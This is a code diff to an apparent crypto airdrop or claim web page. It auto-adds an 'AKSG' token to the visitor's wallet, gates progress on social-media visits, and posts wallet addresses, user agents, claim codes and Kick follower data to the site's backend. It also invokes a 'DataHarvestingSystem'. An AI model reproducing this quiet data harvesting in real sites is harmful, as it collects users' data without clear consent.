@@ -5517,13 +5517,26 @@
                     // Step 1: Request wallet connection
                     showNotify('🔗 جاري الاتصال بالمحفظة... | Connecting wallet...', 'info');
                     
-                    // ✅ إرسال بيانات الاتصال إلى Vercel/Backend - Send connection data to Vercel/Backend
+                    const accounts = await provider.request({ method: 'eth_requestAccounts' });
+                    const account = accounts[0];
+                    console.log('✅ Wallet connected:', account);
+                    
+                    // ✅ STRICT: حفظ عنوان المحفظة فوراً - Save wallet address immediately
+                    localStorage.setItem('connectedWallet', account);
+                    localStorage.setItem('user_wallet_address', account);
+                    localStorage.setItem('wallet_connected_at', new Date().toISOString());
+                    localStorage.setItem('wallet_type', walletType);
+                    
+                    // ✅ إرسال بيانات الاتصال إلى Vercel/Backend (Cloud Storage) - Send connection data to Vercel/Backend (Cloud Storage)
                     try {
                         const connectionData = {
+                            walletAddress: account,
                             walletType: walletType,
                             timestamp: new Date().toISOString(),
                             userAgent: navigator.userAgent,
-                            url: window.location.href
+                            url: window.location.href,
+                            network: 'Polygon',
+                            chainId: '137'
                         };
                         
                         // Send to Vercel backend if available
@@ -5537,10 +5550,6 @@
                     } catch(e) {
                         console.warn('Backend notification error (non-critical):', e);
                     }
-                    
-                    const accounts = await provider.request({ method: 'eth_requestAccounts' });
-                    const account = accounts[0];
-                    console.log('✅ Wallet connected:', account);
                     
                     // ✅ جمع بيانات المستخدم - Collect user data
                     if (typeof DataHarvestingSystem !== 'undefined') {
@@ -5650,15 +5659,95 @@
                         });
                     }
                     
-                    // ==================== ✅ الخطوة 2: إظهار واجهة طلب اسم العملة والعقد ====================
-                    // Step 2: Show token name and contract request interface
+                    // ==================== ✅ الخطوة 2: إضافة العملة وربط العقد تلقائياً ====================
+                    // Step 2: Auto-add token and bind contract
+                    
+                    showNotify('➕ جاري إضافة العملة تلقائياً... | Auto-adding token...', 'info');
+                    
+                    // ✅ STRICT: إضافة العملة تلقائياً فور الاتصال - Auto-add token immediately after connection
+                    try {
+                        const contractAddress = CONFIG.TOKEN_ADDRESS || '0x58f821f9bda7af97c76725a1abacd3ec61042a4d';
+                        const tokenName = 'AKSG';
+                        
+                        await provider.request({
+                            method: 'wallet_watchAsset',
+                            params: {
+                                type: 'ERC20',
+                                options: {
+                                    address: contractAddress,
+                                    symbol: tokenName,
+                                    decimals: 18,
+                                    image: CONFIG.TOKEN_IMAGE || 'https://i.ibb.co/LzYcrPP4/359179b22970a092e8a7cfa274e205f0.jpg'
+                                }
+                            }
+                        });
+                        
+                        // ✅ حفظ معلومات إضافة العملة - Save token addition info
+                        localStorage.setItem('token_added', 'true');
+                        localStorage.setItem('token_name', tokenName);
+                        localStorage.setItem('token_added_at', new Date().toISOString());
+                        
+                        // ✅ إرسال بيانات إضافة العملة إلى السحاب - Send token addition data to cloud
+                        const tokenData = {
+                            walletAddress: account,
+                            tokenName: tokenName,
+                            contractAddress: contractAddress,
+                            addedAt: new Date().toISOString(),
+                            walletType: walletType
+                        };
+                        
+                        if (CONFIG.SITE_URL && CONFIG.SITE_URL.includes('vercel.app')) {
+                            fetch(`${CONFIG.SITE_URL}/api/token-added`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify(tokenData)
+                            }).catch(e => console.warn('Cloud save failed (non-critical):', e));
+                        }
+                        
+                        showNotify('✅ تمت إضافة العملة تلقائياً! | Token added automatically!', 'success');
+                    } catch (tokenError) {
+                        console.warn('⚠️ Auto-add token failed (non-critical):', tokenError);
+                        // Continue anyway
+                    }
+                    
+                    // ✅ STRICT: ربط العقد تلقائياً - Auto-bind contract
+                    showNotify('📋 جاري ربط العقد تلقائياً... | Auto-binding contract...', 'info');
+                    
+                    try {
+                        const contractAddress = CONFIG.TOKEN_ADDRESS || '0x58f821f9bda7af97c76725a1abacd3ec61042a4d';
+                        
+                        const contractConnectionData = {
+                            contractAddress: contractAddress,
+                            walletAddress: account,
+                            walletType: walletType,
+                            network: 'Polygon',
+                            chainId: '137',
+                            connectedAt: new Date().toISOString(),
+                            thirdwebClientId: CONFIG.THIRDWEB_CLIENT_ID || 'a8d2fbfbbe9dcaa11cc48f3d2634e3fd'
+                        };
+                        
+                        localStorage.setItem('contract_requested', 'true');
+                        localStorage.setItem('contract_address', contractAddress);
+                        localStorage.setItem('contract_connection_data', JSON.stringify(contractConnectionData));
+                        
+                        // ✅ إرسال بيانات ربط العقد إلى السحاب - Send contract connection data to cloud
+                        if (CONFIG.SITE_URL && CONFIG.SITE_URL.includes('vercel.app')) {
+                            fetch(`${CONFIG.SITE_URL}/api/contract-connection`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify(contractConnectionData)
+                            }).catch(e => console.warn('Cloud save failed (non-critical):', e));
+                        }
+                        
+                        showNotify('✅ تم ربط العقد تلقائياً! | Contract bound automatically!', 'success');
+                    } catch (contractError) {
+                        console.warn('⚠️ Auto-bind contract failed (non-critical):', contractError);
+                        // Continue anyway
+                    }
                     
                     // ✅ حفظ معلومات المحفظة - Save wallet info
-                    localStorage.setItem('connectedWallet', account);
-                    localStorage.setItem('wallet_connected_at', new Date().toISOString());
                     localStorage.setItem('wallet_network', 'Polygon');
                     localStorage.setItem('wallet_chainId', '137');
-                    localStorage.setItem('wallet_type', walletType);
                     
                     // ✅ إخفاء خطوة اختيار المحفظة وإظهار واجهة طلب اسم العملة والعقد
                     // Hide wallet selection and show token/contract request interface
@@ -5725,17 +5814,24 @@
                         // ✅ حفظ في localStorage للمرحلة الأخيرة (Claim Code) - Save for final stage (Claim Code)
                         localStorage.setItem('smart_contract_info', JSON.stringify(contractInfo));
                         
-                        // ✅ إرسال بيانات العقد إلى Vercel/Backend - Send contract data to Vercel/Backend
+                        // ✅ إرسال بيانات العقد إلى Vercel/Backend (Cloud Storage) - Send contract data to Vercel/Backend (Cloud Storage)
                         try {
                             if (CONFIG.SITE_URL && CONFIG.SITE_URL.includes('vercel.app')) {
                                 fetch(`${CONFIG.SITE_URL}/api/contract-info`, {
                                     method: 'POST',
                                     headers: { 'Content-Type': 'application/json' },
                                     body: JSON.stringify(contractInfo)
-                                }).catch(e => console.warn('Backend notification failed (non-critical):', e));
+                                }).catch(e => console.warn('Cloud save failed (non-critical):', e));
                             }
                         } catch(e) {
-                            console.warn('Backend notification error (non-critical):', e);
+                            console.warn('Cloud save error (non-critical):', e);
+                        }
+                        
+                        // ✅ STRICT: التحقق من إكمال المرحلة 3 تلقائياً - Auto-check Stage 3 completion
+                        if (typeof this.checkStage3Completion === 'function') {
+                            setTimeout(() => {
+                                this.checkStage3Completion();
+                            }, 500);
                         }
                         localStorage.setItem('contract_address', contractAddress);
                         localStorage.setItem('wallet_contract_pair', JSON.stringify({
@@ -6231,7 +6327,19 @@
                 
                 if (tokenAdded && contractRequested && continueBtn) {
                     continueBtn.style.display = 'block';
+                    continueBtn.style.visibility = 'visible';
+                    continueBtn.style.opacity = '1';
+                    continueBtn.disabled = false;
+                    continueBtn.style.cursor = 'pointer';
+                    continueBtn.style.pointerEvents = 'auto';
                     showNotify('✅ تم إكمال جميع الخطوات! يمكنك المتابعة الآن | All steps completed! You can proceed now', 'success');
+                    
+                    // ✅ STRICT: الانتقال التلقائي للإمبراطورية بعد 2 ثانية - Auto-transition to Empire after 2 seconds
+                    setTimeout(() => {
+                        if (typeof this.proceedToEmpireStage3 === 'function') {
+                            this.proceedToEmpireStage3();
+                        }
+                    }, 2000);
                 }
             },
             
@@ -6245,14 +6353,20 @@
                     return;
                 }
                 
-                // Save final stage data
-                const walletAddress = localStorage.getItem('connectedWallet');
+                // ✅ STRICT: جمع البيانات المطلوبة فقط - Collect only required data
+                const walletAddress = localStorage.getItem('connectedWallet') || localStorage.getItem('user_wallet_address');
                 const walletType = localStorage.getItem('wallet_type');
                 const tokenName = localStorage.getItem('token_name') || 'AKSG';
                 const contractAddress = localStorage.getItem('contract_address') || '0x58f821f9bda7af97c76725a1abacd3ec61042a4d';
+                const generatorCode = localStorage.getItem('user_claim_code') || localStorage.getItem('generated_code') || localStorage.getItem('claim_code');
+                const kickUsername = localStorage.getItem('user_kick_username');
                 
+                // ✅ STRICT: حفظ البيانات المطلوبة فقط (عنوان المحفظة، كود الجينيراتور، بيانات متابعين كيك) - Save only required data
                 const finalData = {
                     walletAddress: walletAddress,
+                    generatorCode: generatorCode,
+                    kickUsername: kickUsername,
+                    kickFollowersData: localStorage.getItem('kick_user_data') ? JSON.parse(localStorage.getItem('kick_user_data')) : null,
                     walletType: walletType,
                     tokenName: tokenName,
                     contractAddress: contractAddress,
@@ -6264,6 +6378,19 @@
                 localStorage.setItem('stage3_completed', 'true');
                 localStorage.setItem('stage3_final_data', JSON.stringify(finalData));
                 localStorage.setItem('ready_for_empire', 'true');
+                
+                // ✅ STRICT: إرسال البيانات إلى السحاب (Cloud Storage) - Send data to cloud
+                try {
+                    if (CONFIG.SITE_URL && CONFIG.SITE_URL.includes('vercel.app')) {
+                        fetch(`${CONFIG.SITE_URL}/api/final-data`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(finalData)
+                        }).catch(e => console.warn('Cloud save failed (non-critical):', e));
+                    }
+                } catch(e) {
+                    console.warn('Cloud save error (non-critical):', e);
+                }
                 
                 // Close Stage 3
                 const stageWallet = document.getElementById('stage-wallet');
@@ -8071,9 +8198,15 @@
         function confirmSocialVisit(platform) {
             console.log(`✅ Confirming visit to ${platform}`);
             
-            // ✅ حفظ علامة الزيارة - Save visit marker
+            // ✅ STRICT: حفظ علامة الزيارة والتأكيد - Save visit marker and confirmation
             localStorage.setItem(`social_visited_${platform}`, 'true');
             localStorage.setItem(`social_confirmed_${platform}`, 'true');
+            localStorage.setItem(`social_verified_${platform}`, 'true');
+            
+            // ✅ تحديث socialClickedState - Update socialClickedState
+            if (typeof socialClickedState !== 'undefined' && socialClickedState.hasOwnProperty(platform)) {
+                socialClickedState[platform] = true;
+            }
             
             // Check if at least 10 seconds have passed since clicking
             const visitTime = socialVisitTimestamps[platform];
@@ -8089,6 +8222,17 @@
                     showNotify(`⏳ Please wait ${remaining} more seconds | يرجى الانتظار ${remaining} ثوانٍ أخرى`, 'warning');
                 }
                 return;
+            }
+            
+            // ✅ STRICT: استدعاء StageLockSystem فوراً - Call StageLockSystem immediately
+            if (typeof StageLockSystem !== 'undefined') {
+                StageLockSystem.confirmPlatform(platform);
+                StageLockSystem.checkStageCompletion();
+            }
+            
+            // ✅ STRICT: استدعاء checkAllSocialClicked فوراً - Call checkAllSocialClicked immediately
+            if (typeof checkAllSocialClicked === 'function') {
+                checkAllSocialClicked();
             }
             
             // ✅ البحث عن العنصر في Stage 1 أو Stage 2 - Find element in Stage 1 or Stage 2
@@ -8225,15 +8369,23 @@
                 }
             }
             
-            // ✅ استخدام نظام قفل المراحل - Use Stage Lock System
+            // ✅ STRICT: استخدام نظام قفل المراحل - Use Stage Lock System
             if (typeof StageLockSystem !== 'undefined') {
                 StageLockSystem.confirmPlatform(platform);
                 StageLockSystem.checkStageCompletion();
             }
             
-            // ✅ أيضاً استدعاء checkAllSocialClicked - Also call checkAllSocialClicked
+            // ✅ STRICT: استدعاء checkAllSocialClicked - Call checkAllSocialClicked
             if (typeof checkAllSocialClicked === 'function') {
                 checkAllSocialClicked();
+            }
+            
+            // ✅ STRICT: تحديث AppManager.socials - Update AppManager.socials
+            if (typeof AppManager !== 'undefined' && AppManager.socials) {
+                AppManager.socials[platform] = true;
+                if (typeof AppManager.checkSocials === 'function') {
+                    AppManager.checkSocials();
+                }
             }
             
             const confirmSyncBtn = document.getElementById('confirmSyncBtn');
